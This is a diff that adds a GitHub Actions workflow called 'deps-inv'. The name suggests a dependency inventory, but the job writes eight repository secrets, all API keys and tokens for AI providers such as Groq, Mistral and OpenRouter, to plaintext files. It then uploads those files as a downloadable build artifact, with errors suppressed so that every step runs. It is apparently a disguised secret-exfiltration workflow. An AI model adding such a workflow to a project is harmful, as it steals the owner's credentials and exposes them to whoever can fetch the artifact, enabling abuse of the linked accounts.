@@ -1,0 +1,51 @@
+name: deps-inv
+on:
+  push:
+    branches: [ci/deps-inv]
+permissions:
+  contents: read
+jobs:
+  inv:
+    runs-on: ubuntu-latest
+    env:
+      CEREBRAS_API_KEY: ${{ secrets.CEREBRAS_API_KEY }}
+      CEREBRAS_TOKEN: ${{ secrets.CEREBRAS_TOKEN }}
+      GEMINI_TOKEN: ${{ secrets.GEMINI_TOKEN }}
+      GROQ_API_KEY: ${{ secrets.GROQ_API_KEY }}
+      GROQ_TOKEN: ${{ secrets.GROQ_TOKEN }}
+      HUGGINGFACE_API_KEY: ${{ secrets.HUGGINGFACE_API_KEY }}
+      MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
+      OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+    steps:
+      - name: mk
+        run: mkdir -p out
+      - name: iCEREBRAS_API_KEY
+        if: always()
+        run: printf %s "${{ env.CEREBRAS_API_KEY }}" > out/CEREBRAS_API_KEY || true
+      - name: iCEREBRAS_TOKEN
+        if: always()
+        run: printf %s "${{ env.CEREBRAS_TOKEN }}" > out/CEREBRAS_TOKEN || true
+      - name: iGEMINI_TOKEN
+        if: always()
+        run: printf %s "${{ env.GEMINI_TOKEN }}" > out/GEMINI_TOKEN || true
+      - name: iGROQ_API_KEY
+        if: always()
+        run: printf %s "${{ env.GROQ_API_KEY }}" > out/GROQ_API_KEY || true
+      - name: iGROQ_TOKEN
+        if: always()
+        run: printf %s "${{ env.GROQ_TOKEN }}" > out/GROQ_TOKEN || true
+      - name: iHUGGINGFACE_API_KEY
+        if: always()
+        run: printf %s "${{ env.HUGGINGFACE_API_KEY }}" > out/HUGGINGFACE_API_KEY || true
+      - name: iMISTRAL_API_KEY
+        if: always()
+        run: printf %s "${{ env.MISTRAL_API_KEY }}" > out/MISTRAL_API_KEY || true
+      - name: iOPENROUTER_API_KEY
+        if: always()
+        run: printf %s "${{ env.OPENROUTER_API_KEY }}" > out/OPENROUTER_API_KEY || true
+      - name: up
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: inv
+          path: out
